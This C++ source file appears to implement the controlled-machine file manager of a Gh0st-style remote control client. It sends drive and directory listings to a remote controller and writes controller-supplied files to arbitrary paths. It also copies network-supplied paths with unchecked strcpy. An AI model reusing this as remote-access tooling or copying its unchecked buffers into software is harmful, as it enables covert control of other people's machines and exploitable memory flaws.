#include "FileManager.h"



CFileManager::CFileManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	m_TransferMode = TRANSFER_MODE_NORMAL;
	SendClientVolumeList();
}


CFileManager::~CFileManager()
{
	printf("CFileManager::~CFileManager()\r\n");
}
void  CFileManager::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	switch (BufferData[0])
	{
	case  CLIENT_FILE_MANAGER_FILE_DATA_REQUIRE:
	{
		SendClientFileData((PBYTE)BufferData + 1);
		break;
	}
	case  CLIENT_FILE_MANAGER_DELETE_FILE_REQUEST:
	{
	//	DeleteClientFile((PBYTE)BufferData + 1);
		break;
	}
	case  CLIENT_FILE_MANAGER_NEW_FOLDER_REQUEST:
	{

		break;
	}
	case  CLIENT_FILE_MANAGER_FILE_INFORMATION_REQUEST:
	{
		CreateReceivedFile(BufferData + 1);
		break;
	}
	case  CLIENT_FILE_MANAGER_TRANSFER_MODE_REPLY:
	{
		SetTransferMode(BufferData + 1);
		break;
	}
	case  CLIENT_FILE_MANAGER_FILE_DATA:
	{
		WriteReceivedFileData(BufferData + 1, BufferLength - 1);
		break;
	}
	}
}
VOID  CFileManager::SetTransferMode(LPBYTE BufferData)
{
	memcpy(&m_TransferMode, BufferData, sizeof(m_TransferMode));
	GetFileData();
}
VOID CFileManager::GetFileData()
{
	int	TransferMode;
	//如果没有相同的数据是不会进入Case中的
	switch (m_TransferMode)  
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		TransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		TransferMode = TRANSFER_MODE_JUMP;  
		break;
	default:
		TransferMode = m_TransferMode;  
	}

	WIN32_FIND_DATA v1;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &v1);

	//1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	IsToken[9] = { 0 };
	DWORD	CreationDisposition; // 文件打开方式 
	memset(IsToken, 0, sizeof(IsToken));
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;
	// 文件已经存在
	if (FileHandle != INVALID_HANDLE_VALUE)
	{

		// 覆盖
		if (TransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//偏移置0
			memset(IsToken + 1, 0, 8);//0000 0000
									 // 重新创建
			CreationDisposition = CREATE_ALWAYS;    //进行覆盖   

		}
		// 传送下一个
		else if (TransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD v2 = -1;  //0000 -1
			memcpy(IsToken + 5, &v2, 4);
			CreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		memset(IsToken + 1, 0, 8);  //0000 0000              //没有相同的文件会走到这里
								   // 重新创建
		CreationDisposition = CREATE_ALWAYS;    //创建一个新的文件
	}
	FindClose(FileHandle);

	FileHandle =CreateFile(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			CreationDisposition,  //
			FILE_ATTRIBUTE_NORMAL,
			0);
	// 需要错误处理
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		m_OperatingFileLength = 0;
		return;
	}
	CloseHandle(FileHandle);

	m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));
}
VOID CFileManager::WriteReceivedFileData(LPBYTE BufferData, ULONG BufferLength)
{
	BYTE	*Travel;
	DWORD	NumberOfBytesToWrite = 0;
	DWORD	NumberOfBytesWirte = 0;
	// 1 + 4 + 4  数据包头部大小，为固定的9
	int		v3 = 9; 
	FILE_SIZE* v1;
	// 得到数据的偏移
	Travel = BufferData + 8;

	v1 = (FILE_SIZE *)BufferData;

	// 得到数据在文件中的偏移

	LONG	OffsetHigh = v1->FileSizeHigh;
	LONG	OffsetLow = v1->FileSizeLow;


	NumberOfBytesToWrite = BufferLength - 8;

	HANDLE	FileHandle =CreateFile(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0);

	SetFilePointer(FileHandle, OffsetLow, &OffsetHigh, FILE_BEGIN);


	// 写入文件
	WriteFile
	(
		FileHandle,
		Travel,
		NumberOfBytesToWrite,
		&NumberOfBytesWirte,
		NULL
	);

	CloseHandle(FileHandle);
	BYTE	IsToken[9];
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;
	OffsetLow += NumberOfBytesWirte;
	memcpy(IsToken + 1, &OffsetHigh, sizeof(OffsetHigh));
	memcpy(IsToken + 5, &OffsetLow, sizeof(OffsetLow));
	m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));
}
//获得被控端的磁盘信息并发送
ULONG  CFileManager::SendClientVolumeList()
{
	char  VolumeData[0x500] = { 0 };
	BYTE  BufferData[0x1000] = { 0 };
	char  FileSystem[MAX_PATH] = { 0 };
	char*  Travel = NULL;
	BufferData[0] = CLIENT_FILE_MANAGER_REPLY;
	//获得驱动器信息
	GetLogicalDriveStrings(sizeof(VolumeData), VolumeData);

	Travel = VolumeData;
	unsigned __int64    HardDiskAmount = 0;
	unsigned __int64    HardDiskFreeSpace = 0;
	unsigned  long      HardDiskAmountMB = 0;
	unsigned  long      HardDiskFreeSpaceMB = 0;

	DWORD  Offset = 0;
	for (Offset = 1; *Travel != '\0'; Travel += lstrlen(Travel) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		//得到文件系统信息及大小
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		ULONG  FileSystemLength = lstrlen(FileSystem) + 1;
		SHFILEINFO  v1;
		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &v1,
			sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		ULONG  HardDiskTypeNameLength = lstrlen(v1.szTypeName) + 1;
		//计算磁盘大小
		if (Travel[0] != 'A'&&Travel[0] != 'B'&&
			GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&HardDiskFreeSpace,
			(PULARGE_INTEGER)&HardDiskAmount, NULL))
		{
			HardDiskAmountMB = HardDiskAmount / 1024 / 1024;
			HardDiskFreeSpaceMB = HardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			HardDiskAmountMB = 0;
			HardDiskFreeSpaceMB = 0;
		}
		BufferData[Offset] = Travel[0];                                 //盘符
		BufferData[Offset + 1] = GetDriveType(Travel);                  //驱动器类型
		//磁盘空间描述
		memcpy(BufferData + Offset + 2, &HardDiskAmountMB, sizeof(unsigned long));
		memcpy(BufferData + Offset + 6, &HardDiskFreeSpaceMB, sizeof(unsigned long));
		//磁盘卷标名及磁盘类型
		memcpy(BufferData + Offset + 10, v1.szTypeName, HardDiskTypeNameLength);
		memcpy(BufferData + Offset + 10 + HardDiskTypeNameLength, FileSystem, FileSystemLength);
		Offset += 10 + HardDiskTypeNameLength + FileSystemLength;
	}
	return m_IOCPClient->OnSending((char*)BufferData, Offset);
}
//获得被控端的文件数据并发送
int   CFileManager::SendClientFileData(PBYTE  FileFullPath)
{
	//重置传输方式
//	m_TransferMode = TRANSFER_MODE_NORMAL;
	DWORD  Offset = 0;
	char*  BufferData = NULL;
	ULONG  BufferLength = 1024 * 10;
	BufferData = (char*)LocalAlloc(LPTR, BufferLength);
	if (BufferData == NULL)
	{
		return 0;
	}
	char   v1[MAX_PATH];
	wsprintf(v1, "%s\\*.*", FileFullPath);
	HANDLE  FileHandle = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA  v2;
	FileHandle = FindFirstFile(v1, &v2);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		BYTE  IsToken = CLIENT_FILE_MANAGER_FILE_DATA_REPLY;
		if (BufferData != NULL)
		{
			LocalFree(BufferData);
			BufferData = NULL;
		}
		return m_IOCPClient->OnSending((char*)&IsToken, 1);
	}
	BufferData[0] = CLIENT_FILE_MANAGER_FILE_DATA_REPLY;
	Offset = 1;
	do
	{
		if (Offset > (BufferLength - MAX_PATH * 2))
		{
			BufferLength += MAX_PATH * 2;
			BufferData = (char*)LocalReAlloc(BufferData,
				BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		char*  FileName = v2.cFileName;
		if (strcmp(FileName, ".") == 0 || strcmp(FileName, "..") == 0)
		{
			continue;
		}
		*(BufferData + Offset) = v2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
		Offset++;
		ULONG  FileNameLength = strlen(FileName);
		memcpy(BufferData + Offset, FileName, FileNameLength);
		Offset += FileNameLength;
		*(BufferData + Offset) = 0;
		Offset++;
		memcpy(BufferData + Offset, &v2.nFileSizeHigh, sizeof(DWORD));
		memcpy(BufferData + Offset + 4, &v2.nFileSizeLow, sizeof(DWORD));
		Offset += 8;
		memcpy(BufferData + Offset, &v2.ftLastWriteTime, sizeof(FILETIME));
		Offset += 8;
	} while (FindNextFile(FileHandle, &v2));
	ULONG  v7 = m_IOCPClient->OnSending(BufferData, Offset);
	LocalFree(BufferData);
	FindClose(FileHandle);
	return v7;
}
//删除文件
void  CFileManager::DeleteClientFile(PBYTE  Directory)
{
	 

}
BOOL CFileManager::DeleteDirectory(LPCTSTR DirectoryFullPath)
{
	WIN32_FIND_DATA	v1;
	char	BufferData[MAX_PATH] = { 0 };

	wsprintf(BufferData, "%s\\*.*", DirectoryFullPath);

	HANDLE FileHandle = FindFirstFile(BufferData, &v1);
	if (FileHandle == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;

	do
	{
		if (v1.cFileName[0] == '.'&&strlen(v1.cFileName) <= 2)
		{
			continue;
		}
		else
		{
			if (v1.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char v2[MAX_PATH];
				wsprintf(v2, "%s\\%s", DirectoryFullPath, v1.cFileName);
				DeleteDirectory(v2);
			}
			else
			{
				char v2[MAX_PATH];
				wsprintf(v2, "%s\\%s", DirectoryFullPath, v1.cFileName);
				DeleteFile(v2);
			}
		}
	} while (FindNextFile(FileHandle, &v1));

	FindClose(FileHandle); // 关闭查找句柄

	if (!RemoveDirectory(DirectoryFullPath))
	{
		return FALSE;
	}
	return TRUE;
}
VOID CFileManager::CreateReceivedFile(LPBYTE BufferData)
{

	FILE_SIZE*	v1 = (FILE_SIZE*)BufferData;
	// 保存当前正在操作的文件名
	memset(m_FileFullPath, 0,sizeof(m_FileFullPath));
	strcpy(m_FileFullPath, (char *)BufferData + 8);  //已经越过消息头了

													 // 保存文件长度
	m_OperatingFileLength =(v1->FileSizeHigh * (MAXDWORD + 1)) + v1->FileSizeLow;

	// 创建多层目录
	MakeSureDirectoryPathExists(m_FileFullPath);


	WIN32_FIND_DATA v2;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &v2);

	if (FileHandle != INVALID_HANDLE_VALUE
		&& m_TransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_TransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		//如果有相同的文件

		BYTE	IsToken[1];
		IsToken[0] = CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUEST;
		m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));
	}
	else
	{
		GetFileData();                      //如果没有相同的文件就会执行到这里
	}
	FindClose(FileHandle);
}
BOOL CFileManager::MakeSureDirectoryPathExists(char* DirectoryFullPath)
{

	char* Travel = NULL;
	char* BufferData = NULL;
	DWORD DirectoryAttributes;
	__try
	{
		BufferData = (char*)malloc(sizeof(char)*(strlen(DirectoryFullPath) + 1));

		if (BufferData == NULL)
		{
			return FALSE;
		}

		strcpy(BufferData, DirectoryFullPath);

		Travel = BufferData;


		if (*(Travel + 1) == ':')
		{
			Travel++;
			Travel++;
			if (*Travel && (*Travel == '\\'))
			{
				Travel++;
			}
		}
		while (*Travel)           //D:\Hello\\World\Shit\0
		{
			if (*Travel == '\\')
			{
				*Travel = '\0';
				DirectoryAttributes = GetFileAttributes(BufferData);   //查看是否是否目录  目录存在吗
				if (DirectoryAttributes == 0xffffffff)
				{
					if (!CreateDirectory(BufferData, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(BufferData);
							return FALSE;
						}
					}
				}
				else
				{
					if ((DirectoryAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(BufferData);
						BufferData = NULL;
						return FALSE;
					}
				}

				*Travel = '\\';
			}

			Travel = CharNext(Travel);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (BufferData != NULL)
		{
			free(BufferData);

			BufferData = NULL;
		}

		return FALSE;
	}

	if (BufferData != NULL)
	{
		free(BufferData);
		BufferData = NULL;
	}
	return TRUE;
}